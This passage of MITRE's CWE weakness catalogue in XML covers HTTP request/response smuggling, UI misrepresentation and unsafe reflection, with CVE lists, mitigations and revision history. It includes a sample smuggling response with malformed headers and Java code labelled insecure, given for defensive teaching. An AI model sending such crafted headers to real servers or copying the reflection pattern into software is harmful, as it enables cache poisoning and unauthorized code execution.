               <Body_Text>To avoid this attack a Web server firewall product must be used that is designed to prevent this type of attack.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>
		 The interpretation of HTTP responses can be manipulated if response headers include a space between the header name and colon, or if HTTP 1.1 headers are sent through a proxy configured for HTTP 1.0, allowing for HTTP response smuggling. This can be exploited in web browsers and other applications when used in combination with various proxy servers. For instance, the HTTP response interpreted by the front-end/client HTTP agent/entity - in this case the web browser - can interpret a single response from an adversary-compromised web server as being two responses from two different web sites. In the Example below, notice the extra space after the Content-Length and Set-Cookie headers.</Intro_Text>
               <Example_Code Nature="Attack">
		HTTP/1.1 200 OK<xhtml:br/>
		Date: Fri, 08 Aug 2016 08:12:31 GMT<xhtml:br/>
		Server: Apache (Unix)<xhtml:br/>
		Connection: Keep-Alive<xhtml:br/>
		Content-Encoding: gzip<xhtml:br/>
		Content-Type: text/html<xhtml:br/>
		<xhtml:b>Content-Length :</xhtml:b> 2345<xhtml:br/>
		Transfer-Encoding: chunked<xhtml:br/>
		<xhtml:b>Set-Cookie :</xhtml:b> token="Malicious Code"<xhtml:br/>
		<xhtml:br/>
		&lt;HTML&gt; ... "Malicious Code"<xhtml:br/>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
	   <Observed_Example>
	     <Reference>CVE-2022-24766</Reference>
	     <Description>SSL/TLS-capable proxy allows HTTP smuggling when used in tandem with HTTP/1.0 services, due to inconsistent interpretation and input sanitization of HTTP messages within the body of another message</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2022-24766</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2021-37147</Reference>
	     <Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2020-8287</Reference>
	     <Description>Node.js platform allows request smuggling via two Transfer-Encoding headers</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2020-8287</Link>
	   </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2006-6276</Reference>
	     <Description>Web servers allow request smuggling via inconsistent HTTP headers.</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2006-6276</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2088</Reference>
               <Description>HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2088</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2089</Reference>
               <Description>HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2089</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>HTTP Request Smuggling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>26</Entry_ID>
               <Entry_Name>HTTP Request Smuggling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>27</Entry_ID>
               <Entry_Name>HTTP Response Smuggling</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="273"/>
            <Related_Attack_Pattern CAPEC_ID="33"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-433"/>
            <Reference External_Reference_ID="REF-1273"/>
            <Reference External_Reference_ID="REF-1274"/>
            <Reference External_Reference_ID="REF-1275"/>
            <Reference External_Reference_ID="REF-1276"/>
            <Reference External_Reference_ID="REF-1277"/>
            <Reference External_Reference_ID="REF-1278"/>
         </References>
         <Notes>
            <Note Type="Theoretical">Request smuggling can be performed due to a multiple interpretation error, where the target is an intermediary or monitor, via a consistency manipulation (Transfer-Encoding and Content-Length headers).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Name, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Potential_Mitigations, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
				  <Modification_Name>CWE Content Team</Modification_Name>
				  <Modification_Organization>MITRE</Modification_Organization>
				  <Modification_Date>2022-06-28</Modification_Date>
				  <Modification_Importance>Critical</Modification_Importance>
				  <Modification_Comment>Extended the abstraction of this entry to include both HTTP request and response smuggling.</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Common_Consequences, Demonstrative_Examples, Description, Name, Observed_Examples, References, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">HTTP Request Smuggling</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">Interpretation Conflict in Web Traffic (aka 'HTTP Request Smuggling')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Inconsistent Interpretation of HTTP Requests (aka 'HTTP Request Smuggling')</Previous_Entry_Name>
			<Previous_Entry_Name Date="2022-06-28">Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="451" Name="User Interface (UI) Misrepresentation of Critical Information" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker can cause the UI to display erroneous data, or to otherwise convince the user to display information that appears to come from a trusted source, then the attacker could trick the user into performing the wrong action. This is often a component in phishing attacks, but other kinds of problems exist. For example, if the UI is used to monitor the security state of a system or network, then omitting or obscuring an important indicator could prevent the user from detecting and reacting to a security-critical event.</xhtml:p>
            <xhtml:p>UI misrepresentation can take many forms:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Incorrect indicator: incorrect information is displayed, which prevents the user from understanding the true state of the product or the environment the product is monitoring, especially of potentially-dangerous conditions or operations. This can be broken down into several different subtypes.</xhtml:li>
                  <xhtml:li>Overlay: an area of the display is intended to give critical information, but another process can modify the display by overlaying another element on top of it. The user is not interacting with the expected portion of the user interface. This is the problem that enables clickjacking attacks, although many other types of attacks exist that involve overlay.</xhtml:li>
                  <xhtml:li>Icon manipulation: the wrong icon, or the wrong color indicator, can be influenced (such as making a dangerous .EXE executable look like a harmless .GIF)</xhtml:li>
                  <xhtml:li>Timing: the product is performing a state transition or context switch that is presented to the user with an indicator, but a race condition can cause the wrong indicator to be used before the product has fully switched context. The race window could be extended indefinitely if the attacker can trigger an error.</xhtml:li>
                  <xhtml:li>Visual truncation: important information could be truncated from the display, such as a long filename with a dangerous extension that is not displayed in the GUI because the malicious portion is truncated. The use of excessive whitespace can also cause truncation, or place the potentially-dangerous indicator outside of the user's field of view (e.g. "filename.txt .exe"). A different type of truncation can occur when a portion of the information is removed due to reasons other than length, such as the accidental insertion of an end-of-input marker in the middle of an input, such as a NUL byte in a C-style string.</xhtml:li>
                  <xhtml:li>Visual distinction: visual information might be presented in a way that makes it difficult for the user to quickly and correctly distinguish between critical and unimportant segments of the display.</xhtml:li>
                  <xhtml:li>Homographs: letters from different character sets, fonts, or languages can appear very similar (i.e. may be visually equivalent) in a way that causes the human user to misread the text (for example, to conduct phishing attacks to trick a user into visiting a malicious web site with a visually-similar name as a trusted site). This can be regarded as a type of visual distinction issue.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="684" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="221" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="346" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Hide Activities</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Perform data validation (e.g. syntax, length, etc.) before interpreting the data.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Create a strategy for presenting information, and plan for how to display unusual characters.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-2227</Reference>
               <Description>Web browser's filename selection dialog only shows the beginning portion of long filenames, which can trick users into launching executables with dangerous extensions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0398</Reference>
               <Description>Attachment with many spaces in filename bypasses "dangerous content" warning and uses different icon. Likely resultant.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0398</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0643</Reference>
               <Description>Misrepresentation and equivalence issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0643</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0593</Reference>
               <Description>Lock spoofing from several different weaknesses.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0593</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1104</Reference>
               <Description>Incorrect indicator: web browser can be tricked into presenting the wrong URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1104</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0143</Reference>
               <Description>Incorrect indicator: Lock icon displayed when an insecure page loads a binary file loaded from a trusted site.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0143</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0144</Reference>
               <Description>Incorrect indicator: Secure "lock" icon is presented for one channel, while an insecure page is being simultaneously loaded in another channel.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0144</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0761</Reference>
               <Description>Incorrect indicator: Certain redirect sequences cause security lock icon to appear in web browser, even when page is not encrypted.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0761</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2219</Reference>
               <Description>Incorrect indicator: Spoofing via multi-step attack that causes incorrect information to be displayed in browser address bar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2219</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0537</Reference>
               <Description>Overlay: Wide "favorites" icon can overlay and obscure address bar</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2271</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2271</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2272</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2273</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2274</Reference>
               <Description>Visual distinction: Web browsers do not clearly associate a Javascript dialog box with the web page that generated it, allowing spoof of the source of the dialog. "origin validation error" of a sort?</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1410</Reference>
               <Description>Visual distinction: Browser allows attackers to create chromeless windows and spoof victim's display using unprotected Javascript method.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1410</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0197</Reference>
               <Description>Visual distinction: Chat client allows remote attackers to spoof encrypted, trusted messages with lines that begin with a special sequence, which makes the message appear legitimate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0197</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0831</Reference>
               <Description>Visual distinction: Product allows spoofing names of other users by registering with a username containing hex-encoded characters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0831</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1025</Reference>
               <Description>Visual truncation: Special character in URL causes web browser to truncate the user portion of the "user@domain" URL, hiding real domain in the address bar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1025</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0243</Reference>
               <Description>Visual truncation: Chat client does not display long filenames in file dialog boxes, allowing dangerous extensions via manipulations including (1) many spaces and (2) multiple file extensions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0243</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1575</Reference>
               <Description>Visual truncation: Web browser file download type can be hidden using whitespace.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2530</Reference>
               <Description>Visual truncation: Visual truncation in chat client using whitespace to hide dangerous file extension.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2530</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0590</Reference>
               <Description>Visual truncation: Dialog box in web browser allows user to spoof the hostname via a long "user:pass" sequence in the URL, which appears before the real hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0590</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1451</Reference>
               <Description>Visual truncation: Null character in URL prevents entire URL from being displayed in web browser.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1451</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2258</Reference>
               <Description>Miscellaneous -- [step-based attack, GUI] -- Password-protected tab can be bypassed by switching to another tab, then back to original tab.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2258</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1678</Reference>
               <Description>Miscellaneous -- Dangerous file extensions not displayed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1678</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0722</Reference>
               <Description>Miscellaneous -- Web browser allows remote attackers to misrepresent the source of a file in the File Download dialog box.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0722</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>UI Misrepresentation of Critical Information</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="154"/>
            <Related_Attack_Pattern CAPEC_ID="163"/>
            <Related_Attack_Pattern CAPEC_ID="164"/>
            <Related_Attack_Pattern CAPEC_ID="173"/>
            <Related_Attack_Pattern CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-434" Section="7.16. Foil Semantic Attacks"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry should be broken down into more precise entries. See extended description.</Note>
            <Note Type="Research Gap">Misrepresentation problems are frequently studied in web browsers, but there are no known efforts for classifying these kinds of problems in terms of the shortcomings of the interface. In addition, many misrepresentation issues are resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-13</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Defined several different subtypes of this issue.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Maintenance_Notes, Name, Observed_Examples, Other_Notes, References, Relationships, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2014-02-18">UI Misrepresentation of Critical Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="470" Name="Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.</Description>
         <Extended_Description>If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Reflection Injection</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Note>The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Other</Impact>
               <Note>The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Refactor your code to avoid using reflection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use user-controlled inputs to select and load classes or code.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Apply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:</Intro_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Worker ao = null;<xhtml:br/>if (ctl.equals("Add")) {<xhtml:div style="margin-left:1em;">ao = new AddCommand();</xhtml:div>}<xhtml:br/>else if (ctl.equals("Modify")) {<xhtml:div style="margin-left:1em;">ao = new ModifyCommand();</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">throw new UnknownActionError();</xhtml:div>}<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
               <Body_Text>A programmer might refactor this code to use reflection as follows:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Class cmdClass = Class.forName(ctl + "Command");<xhtml:br/>Worker ao = (Worker) cmdClass.newInstance();<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
               <Body_Text>The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control.</Body_Text>
               <Body_Text>One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ctl = request.getParameter("ctl");<xhtml:br/>Class cmdClass = Class.forName(ctl + "Command");<xhtml:br/>Worker ao = (Worker) cmdClass.newInstance();<xhtml:br/>ao.checkAccessControl(request);<xhtml:br/>ao.doAction(request);</xhtml:div>
               </Example_Code>
